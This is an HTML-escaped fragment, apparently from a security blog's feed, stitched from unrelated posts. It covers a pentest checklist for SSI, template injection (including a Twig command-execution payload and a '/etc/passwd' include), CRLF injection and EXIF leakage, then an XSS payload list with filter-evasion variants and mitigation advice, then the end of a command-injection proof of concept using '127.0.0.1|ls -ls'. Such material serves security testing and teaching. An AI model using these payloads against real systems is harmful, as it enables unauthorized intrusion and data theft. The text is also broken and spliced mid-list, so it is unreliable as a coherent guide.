&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Intercept the request using Burp Suite.&lt;/li&gt;
&lt;li&gt;Spider the target host.&lt;/li&gt;
&lt;li&gt;Search for pages with &lt;code&gt;.shtml&lt;/code&gt; extensions.&lt;/li&gt;
&lt;li&gt;Inject payloads like &lt;code&gt;&amp;lt;!--#echo var=&amp;quot;DATE_LOCAL&amp;quot; --&amp;gt;&lt;/code&gt; into input fields.&lt;/li&gt;
&lt;li&gt;Forward the request and check the response for injected data.****&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;38-client-and-server-side-template-injection&#34;&gt;38. Client and Server-Side Template Injection
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Check if user input is reflected on the webpage. Insert payloads to test for template injection.&lt;/li&gt;
&lt;li&gt;Common Template Engines:
&lt;ul&gt;
&lt;li&gt;FreeMarker (Java-based)&lt;/li&gt;
&lt;li&gt;Velocity (Java-based)&lt;/li&gt;
&lt;li&gt;Smarty (PHP-based)&lt;/li&gt;
&lt;li&gt;Twig (PHP-based)&lt;/li&gt;
&lt;li&gt;Jade (Node.js-based)&lt;/li&gt;
&lt;li&gt;Jinja2 (Python/Flask-based)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;Manual Checking:&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Example Payloads:
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;curl -g &#39;&amp;lt;http://www.target.com/page?name=John&#39;&lt;/code&gt;&amp;gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;curl -g &#39;&amp;lt;http://www.target.com/page?name={{7*7}&amp;gt;}&#39;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;Automation Tool:&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;https://github.com/epinna/tplmap&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;Basic Payloads:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;{{7*7}}&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;{{7*&#39;7&#39;}}&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;{% extends &amp;quot;/etc/passwd&amp;quot; %}&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;RCE Payload (Twig):&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;{{_self.env.registerUndefinedFilterCallback(&amp;quot;exec&amp;quot;)}}{{_self.env.getFilter(&amp;quot;id&amp;quot;)}}&lt;/code&gt;&lt;strong&gt;Tool Used:&lt;/strong&gt; Manual Checking, curl, tplmap&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;39-exif-geolocation-data-not-stripped&#34;&gt;39. Exif GeoLocation Data Not Stripped
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Download an image from &lt;code&gt;https://github.com/ianare/exif-samples&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Go to JPG properties and check GPS data.&lt;/li&gt;
&lt;li&gt;Upload the image to the target website.&lt;/li&gt;
&lt;li&gt;Copy the image URL and paste it into an EXIF data tool (e.g., &lt;code&gt;http://metapicz.com/&lt;/code&gt;).&lt;strong&gt;Tool Used:&lt;/strong&gt; &lt;a class=&#34;link&#34; href=&#34;http://exif.regex.info/exif.cgi&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Exif.regex.info/exif.cgi&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;40-crlf-injection&#34;&gt;40. CRLF Injection
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Capture a request using Burp Suite.&lt;/li&gt;
&lt;li&gt;Insert arbitrary data in the input field (e.g., &lt;code&gt;aaaaaaaaaaaaa&lt;/code&gt;).&lt;/li&gt;
&lt;li&gt;If the input is reflected in the response header, it may be vulnerable.&lt;/li&gt;
&lt;li&gt;Test Carriage Return (&lt;code&gt;%0A&lt;/code&gt;) and Linefeed (&lt;code&gt;%0D&lt;/code&gt;) payloads.&lt;/li&gt;
&lt;li&gt;Example Payload:
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;%0a%0dxxxxxxxxxxxxx&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;return_url=aaaa%0a%0dset-cookie:mycookie&lt;/code&gt;****&lt;/li&gt;
&lt;/ul&gt;

        <description>&lt;img src="https://blogdetectify.cdn.triggerfish.cloud/uploads/2015/12/04174531/What-is-Cross-site-Scripting-XSS-and-how-can-you-fix-it_.png" alt="Featured image of post Cross-Site Scripting (XSS) Payloads and Mitigation Strategies" /&gt;&lt;h1 id=&#34;payloads-for-cross-site-scripting-xss-payloads&#34;&gt;Payloads for Cross-Site Scripting (XSS) Payloads
&lt;/h1&gt;&lt;h2 id=&#34;cross-site-scripting-xss&#34;&gt;Cross-Site Scripting (XSS)
&lt;/h2&gt;&lt;p&gt;Cross-Site Scripting (XSS) is a type of security vulnerability commonly found in web applications. It occurs when an attacker is able to inject malicious scripts (typically written in JavaScript) into web pages viewed by other users. This can happen when user input is not properly validated or sanitized by the application before being displayed to other users.&lt;/p&gt;
&lt;p&gt;There are several types of XSS attacks:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;Stored XSS:&lt;/strong&gt; Also known as persistent XSS, this occurs when the injected script is permanently stored on the target server, such as in a database or a file. Whenever a user visits the affected page, the malicious script is executed.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Reflected XSS:&lt;/strong&gt; In this type of attack, the injected script is reflected off the web server, such as in an error message or search result. The attacker typically tricks a victim into clicking on a specially crafted link that contains the malicious payload.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;DOM-based XSS:&lt;/strong&gt; This occurs when the client-side script modifies the DOM (Document Object Model) in an unsafe way, leading to a XSS vulnerability. Unlike traditional XSS attacks, DOM-based XSS does not involve the server-side code.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;XSS attacks can have serious consequences, including:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Theft of sensitive information such as cookies, session tokens, and login credentials.&lt;/li&gt;
&lt;li&gt;Manipulation of user sessions and actions.&lt;/li&gt;
&lt;li&gt;Defacement of websites.&lt;/li&gt;
&lt;li&gt;Distribution of malware to other users.&lt;/li&gt;
&lt;li&gt;Redirection to malicious websites.&lt;/li&gt;
&lt;li&gt;Compromise of user privacy.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;vulnerability-details&#34;&gt;Vulnerability Details:
&lt;/h2&gt;&lt;h3 id=&#34;xss-in-htmlapplications&#34;&gt;XSS in HTML/Applications:

&lt;li&gt;&lt;code&gt;&amp;lt;img src=x onerror=alert(&#39;XSS&#39;)//&lt;/code&gt;: Uses a comment to bypass filters.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;img src=x onerror=alert(String.fromCharCode(88,83,83));&amp;gt;&lt;/code&gt;: Uses character encoding for the alert message.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));&amp;gt;&lt;/code&gt;: Repeats characters to evade detection.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;img src=x:alert(alt) onerror=eval(src) alt=xss&amp;gt;&lt;/code&gt;: Injects JavaScript through the alt attribute.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;quot;&amp;gt;&amp;lt;img src=x onerror=alert(&#39;XSS&#39;);&amp;gt;&lt;/code&gt;: Injects JavaScript within an HTML attribute.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;svgonload=alert(1)&amp;gt;&lt;/code&gt;: Triggers an alert when the SVG loads.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;svg/onload=alert(&#39;XSS&#39;)&amp;gt;&lt;/code&gt;: Injects JavaScript within the onload attribute.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;svg onload=alert(1)//&lt;/code&gt;: Utilizes a comment to bypass filters.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;svg/onload=alert(String.fromCharCode(88,83,83))&amp;gt;&lt;/code&gt;: Uses character encoding for the alert message.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;svg id=alert(1) onload=eval(id)&amp;gt;&lt;/code&gt;: Dynamically executes the alert using the id attribute.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;quot;&amp;gt;&amp;lt;svg/onload=alert(String.fromCharCode(88,83,83))&amp;gt;&lt;/code&gt;: Injects JavaScript within an HTML attribute.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Div Payloads:&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;div onpointerover=&amp;quot;alert(45)&amp;quot;&amp;gt;MOVE HERE&amp;lt;/div&amp;gt;&lt;/code&gt;: Triggers an alert when the mouse pointer moves over the div element.&lt;/li&gt;

&lt;h2 id=&#34;recommendation&#34;&gt;Recommendation:
&lt;/h2&gt;&lt;p&gt;To mitigate the risk of XSS attacks, the following recommendations are provided:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Implement strict input validation mechanisms to filter out potentially malicious input.&lt;/li&gt;
&lt;li&gt;Utilize output encoding techniques (e.g., HTML entity encoding, JavaScript escaping) to render user-supplied data safely.&lt;/li&gt;
&lt;li&gt;Implement a Content Security Policy (CSP) to restrict the execution of inline scripts and mitigate XSS risks.&lt;/li&gt;
&lt;li&gt;Conduct regular security assessments, including code reviews and penetration tests, to identify and remediate vulnerabilities.&lt;/li&gt;
&lt;li&gt;Educate developers on secure coding practices to prevent the introduction of XSS vulnerabilities in future development efforts.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The identified XSS vulnerabilities pose a significant threat to the security. By exploiting these vulnerabilities, attackers could execute arbitrary JavaScript code within the context of users&amp;rsquo; browsers, leading to various security risks, including data theft and unauthorized access. It is imperative that immediate action is taken to address these vulnerabilities and implement the recommended mitigation strategies to safeguard the application against XSS attacks.&lt;/p&gt;

&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;The script serves as a Proof of Concept (PoC) to exploit a command injection vulnerability in a web application.&lt;/li&gt;
&lt;li&gt;It demonstrates how an attacker can execute arbitrary commands on the target system through the vulnerability.&lt;/li&gt;
&lt;li&gt;By injecting specially crafted commands, the attacker gains unauthorized access to the system.&lt;/li&gt;
&lt;li&gt;This unauthorized access can lead to further exploitation, such as data theft, system compromise, or launching other attacks.&lt;/li&gt;
&lt;li&gt;It&amp;rsquo;s crucial to emphasize that exploiting vulnerabilities without proper authorization is both illegal and unethical.&lt;/li&gt;
&lt;/ul&gt;

&lt;li&gt;&lt;strong&gt;Bypass&lt;/strong&gt;: Identified space after &lt;code&gt;|&lt;/code&gt; character, used &lt;code&gt;127.0.0.1|ls -ls&lt;/code&gt; payload for success.&lt;/li&gt;
